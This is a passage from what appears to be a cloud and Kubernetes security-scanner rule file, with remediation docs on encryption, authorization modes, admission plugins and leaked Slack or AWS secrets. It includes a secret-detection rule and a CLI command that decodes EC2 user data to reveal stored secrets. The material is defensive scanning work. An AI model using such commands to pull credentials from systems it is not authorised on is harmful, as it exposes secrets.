<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_postgresql_server</li>
<li><strong>Argument:</strong> infrastructure_encryption_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_postgresql_server" "example" {
              ...
+             infrastructure_encryption_enabled = true
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-infrastructure-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-infrastructure-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-postgresql-server-enables-infrastructure-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_131</key>
    <name>Ensure security contact emails are set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="security-contact-emails-are-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-security-contact-emails-are-not-set"></div>Security contact emails are not set</div><a aria-label="Skip link to Security contact emails are not set" class="heading-anchor-icon fa fa-anchor" href="#security-contact-emails-are-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Security Center recommends adding one valid security contact email address for each Microsoft Azure subscription. Security Center emails designated administrators using the defined security contact in case the Microsoft security team find Azure cloud resources are compromised.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_security_center_contact</li>
<li><strong>Argument:</strong> email - (Required) The email of the Security Center Contact.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_security_center_contact" "example" {
+  email = "<a class="__cf_email__" data-cfemail="99faf6f7edf8faedd9fce1f8f4e9f5fcb7faf6f4" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
        ...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-security-contact-emails-is-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-security-contact-emails-is-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-security-contact-emails-is-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_69</key>
    <name>Ensure the GKE metadata server is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-gke-metadata-server-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-gke-metadata-server-is-disabled"></div>The GKE metadata server is disabled</div><a aria-label="Skip link to The GKE metadata server is disabled" class="heading-anchor-icon fa fa-anchor" href="#the-gke-metadata-server-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Running the GKE Metadata Server prevents workloads from accessing sensitive instance metadata and facilitates Workload Identity.</p>
<p>Every node stores its metadata on a metadata server. Some of this metadata, such as kubelet credentials and the VM instance identity token, is sensitive and should not be exposed to a Kubernetes workload. Enabling the GKE Metadata server prevents pods (that are not running on the host network) from accessing this metadata and facilitates Workload Identity.</p>
<p>When unspecified, the default setting allows running pods to have full access to the node's underlying metadata server.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_container_cluster / google_container_node_pool</li>
<li><strong>Argument:</strong> node_config.workload_metadata_config.node_metadata</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_container_cluster" "example" {
  name               = var.name
  location           = var.location
  initial_node_count = 1
  project            = data.google_project.project.name

+ node_config {
+   workload_metadata_config {
+     node_metadata = "GKE_METADATA_SERVER"
+   }
+ }
  
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-the-gke-metadata-server-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-the-gke-metadata-server-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-the-gke-metadata-server-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_73</key>
    <name>Ensure the --kubelet-certificate-authority argument is set appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---kubelet-certificate-authority-argument-is-not-set-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-kubelet-certificate-authority-argument-is-not-set-appropriately"></div>The --kubelet-certificate-authority argument is not set appropriately</div><a aria-label="Skip link to The --kubelet-certificate-authority argument is not set appropriately" class="heading-anchor-icon fa fa-anchor" href="#the---kubelet-certificate-authority-argument-is-not-set-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Verify kubelet's certificate before establishing connection.The connections from the apiserver to the kubelet are used for fetching logs for pods, attaching (through kubectl) to running pods, and using the kubelet&#8217;s port-forwarding functionality. These connections terminate at the kubelet&#8217;s HTTPS endpoint. By default, the apiserver does not verify the kubelet&#8217;s serving certificate, which makes the connection subject to man-in-the-middle attacks, and unsafe to run over untrusted and/or public networks.</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h2>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --kubelet-certificate-authority=ca.file
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-certificate-authority-argument-is-set-as-appropriate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-certificate-authority-argument-is-set-as-appropriate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-kubelet-certificate-authority-argument-is-set-as-appropriate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_14</key>
    <name>Slack Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="slack-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-slack-token"></div>Slack Token</div><a aria-label="Skip link to Slack Token" class="heading-anchor-icon fa fa-anchor" href="#slack-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Slack API tokens can be created for both members and bot users. For added security, it is recommended to rotate these tokens periodically. Slack will automatically revoke old tokens if they remain unused for long periods of time.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke the exposed secret.<br/>
Go to <a href="http://api.slack.com/methods/auth.revoke/test" target="_self">auth.revoke</a> to revoke your token.<br/>
Method URL:	<a href="https://slack.com/api/auth.revoke" target="_self">https://slack.com/api/auth.revoke</a><br/>
Preferred HTTP method:	GET<br/>
Accepted content types:	application/x-www-form-urlencoded</p>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Inspect Slack's Events API log to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_14' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_14</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_14' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_46</key>
    <name>Ensure EC2 user data does not expose secrets</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ec2-user-data-exposes-secrets"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ec-2-user-data-exposes-secrets"></div>EC2 user data exposes secrets</div><a aria-label="Skip link to EC2 user data exposes secrets" class="heading-anchor-icon fa fa-anchor" href="#ec2-user-data-exposes-secrets"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p><strong>User Data</strong> is a metadata field of an EC2 instance that allows custom code to run after the instance is launched. It contains code exposed to any entity which has the most basic access to EC2, even read-only configurations. This code is not encrypted.</p>
<p>Removing secrets from easily-accessed unencrypted places reduces the risk of passwords, private keys and more from being exposed to third parties.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To see the secret, run the following CLI command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws ec2 describe-instance-attribute 
--attribute userData 
--region &lt;REGION&gt; 
--instance-id &lt;INSTANCE_ID&gt; 
--query UserData.Value 
--output text &gt; encodeddata; base64 
--decode encodeddata
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p><strong>Resource:</strong> aws_instance<br/>
<strong>Argument:</strong> user_data<br/>
In this case, the analysis has found a likely AWS secret being used in your user_data. Remove these secrets, substitute with dynamic (i.e. Obtain from Vault) or use instance profiles.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_instance.web.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_instance.web.tf">resource "aws_instance" "web" {
    ...
    instance_type = "t3.micro"
-    user_data = "access_key=123456ABCDEFGHIJZTLA and secret_key=AAAaa+Aa4AAaAA6aAkA0Ad+Aa8aA1aaaAAAaAaA"
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<p><strong>Resource:</strong> AWS::EC2::Instance<br/>
<strong>Argument:</strong> Properties.UserData</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Instance:
    Type: AWS::EC2::Instance
    Properties:
      ...
-     UserData: "..."
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_secrets_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_secrets_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_secrets_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_74</key>
    <name>Ensure the --authorization-mode argument is not set to AlwaysAllow</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---authorization-mode-argument-is-set-to-alwaysallow"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-authorization-mode-argument-is-set-to-always-allow"></div>The --authorization-mode argument is set to AlwaysAllow </div><a aria-label="Skip link to The --authorization-mode argument is set to AlwaysAllow " class="heading-anchor-icon fa fa-anchor" href="#the---authorization-mode-argument-is-set-to-alwaysallow"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not always authorize all requests. The API Server, can be configured to allow all requests. This mode should not be used on any production cluster.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --authorization-mode=RBAC,node
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-is-not-set-to-alwaysallow-1' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-is-not-set-to-alwaysallow-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-is-not-set-to-alwaysallow-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_75</key>
    <name>Ensure the --authorization-mode argument includes node</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---authorization-mode-argument-does-not-include-node"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-authorization-mode-argument-does-not-include-node"></div>The --authorization-mode argument does not include node</div><a aria-label="Skip link to The --authorization-mode argument does not include node" class="heading-anchor-icon fa fa-anchor" href="#the---authorization-mode-argument-does-not-include-node"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Restrict kubelet nodes to reading only objects associated with them. The Node authorization mode only allows kubelets to read Secret, ConfigMap, PersistentVolume, and PersistentVolumeClaim objects associated with their nodes.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+    - kube-apiserver
+    - --authorization-mode=RBAC,Node
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-includes-node' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-includes-node</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-includes-node' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_77</key>
    <name>Ensure the --authorization-mode argument includes RBAC</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the---authorization-mode-argument-does-not-include-rbac"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-authorization-mode-argument-does-not-include-rbac"></div>The --authorization-mode argument does not include RBAC</div><a aria-label="Skip link to The --authorization-mode argument does not include RBAC" class="heading-anchor-icon fa fa-anchor" href="#the---authorization-mode-argument-does-not-include-rbac"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Turn on Role Based Access Control.<br/>
Role Based Access Control (RBAC) allows fine-grained control over the operations that different entities can perform on different objects in the cluster. It is recommended to use the RBAC authorization mode.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-apiserver
    tier: control-plane
  name: kube-apiserver
  namespace: kube-system
spec:
  containers:
  - command:
+   - kube-apiserver
+   - --authorization-mode=RBAC,Node
    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0
    ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-includes-rbac' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-includes-rbac</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-authorization-mode-argument-includes-rbac' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_78</key>
    <name>Ensure the admission control plugin EventRateLimit is set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-admission-control-plugin-eventratelimit-is-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-admission-control-plugin-event-rate-limit-is-not-set"></div>The admission control plugin EventRateLimit is not set</div><a aria-label="Skip link to The admission control plugin EventRateLimit is not set" class="heading-anchor-icon fa fa-anchor" href="#the-admission-control-plugin-eventratelimit-is-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Limit the rate at which the API server accepts requests.<br/>
Using EventRateLimit admission control enforces a limit on the number of events that the API Server will accept in a given time slice. A misbehaving workload could overwhelm and DoS the API Server, making it unavailable. This particularly applies to a multi-tenant cluster, where there might be a small percentage of misbehaving tenants which could have a significant impact on the performance of the cluster overall. Hence, it is recommended to limit the rate of events that the API server will accept.<br/>
Note: This is an Alpha feature in the Kubernetes 1.15 release.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Kind:</strong> Pod</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: apiserver.config.k8s.io/v1
kind: AdmissionConfiguration
metadata:
  name: "admission-configuration-passed"
plugins:
  - name: ValidatingAdmissionWebhook
    configuration:
      apiVersion: apiserver.config.k8s.io/v1
      kind: WebhookAdmissionConfiguration
      kubeConfigFile: "&lt;path-to-kubeconfig-file&gt;"
+ - name: EventRateLimit
+   path: eventconfig.yaml
  - name: MutatingAdmissionWebhook
    configuration:
      apiVersion: apiserver.config.k8s.io/v1
      kind: WebhookAdmissionConfiguration
      kubeConfigFile: "&lt;path-to-kubeconfig-file&gt;"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-eventratelimit-is-set' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-eventratelimit-is-set</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-the-admission-control-plugin-eventratelimit-is-set' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_79</key>
    <name>Ensure the admission control plugin AlwaysAdmit is not set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-admission-control-plugin-alwaysadmit-is-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-admission-control-plugin-always-admit-is-set"></div>The admission control plugin AlwaysAdmit is set</div><a aria-label="Skip link to The admission control plugin AlwaysAdmit is set" class="heading-anchor-icon fa fa-anchor" href="#the-admission-control-plugin-alwaysadmit-is-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Do not allow all requests. Setting admission control plugin AlwaysAdmit allows all requests and do not filter any requests.<br/>
The AlwaysAdmit admission controller was deprecated in Kubernetes v1.13. Its behavior was equivalent to turning off all admission controllers.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
